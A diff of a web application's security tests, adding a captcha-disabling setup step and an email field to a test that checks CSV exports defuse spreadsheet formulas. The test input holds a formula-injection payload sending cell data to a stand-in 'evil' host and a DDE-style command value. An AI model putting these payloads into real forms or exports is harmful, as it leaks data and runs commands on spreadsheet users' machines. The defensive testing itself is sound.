@@ -50,6 +50,7 @@ before(async () => {
   await tenants.createTenant({ slug: A, name: 'Sec A', domains: [HA], adminPassword: PW });
   await tenants.createTenant({ slug: B, name: 'Sec B', domains: [HB], adminPassword: PW });
   for (const s of [A, B]) await db.withSchema('tenant_' + s, () => db.query("UPDATE admin_users SET must_change_password = 0"));
+  for (const s of [A, B]) await db.withSchema('tenant_' + s, () => require('../src/lib/settings').set('spam_math_captcha', '0')); // forms are posted without solving the math check
   app = require('http').createServer(createApp());
   await new Promise(r => app.listen(0, '127.0.0.1', r));
 });
@@ -105,7 +106,7 @@ test('X-Forwarded-For does not bypass rate limits when no proxy is configured', 
 
 test('CSV exports neutralise spreadsheet formulas from public submissions', async () => {
   const c = client(HA);
-  const r = await c.form('/apply/grievance', { name: '=HYPERLINK("https://evil/?d="&C2,"x")', phone: '9841000011', subject: '@SUM(1+1)*cmd|x,y', description: 'd', category: 'service' });
+  const r = await c.form('/apply/grievance', { name: '=HYPERLINK("https://evil/?d="&C2,"x")', phone: '9841000011', email: 'csv@example.com', subject: '@SUM(1+1)*cmd|x,y', description: 'd', category: 'service' });
   assert.equal(r.status, 302);
   const adm = client(HA);
   await adm.form('/admin/login', { username: 'admin', password: PW });
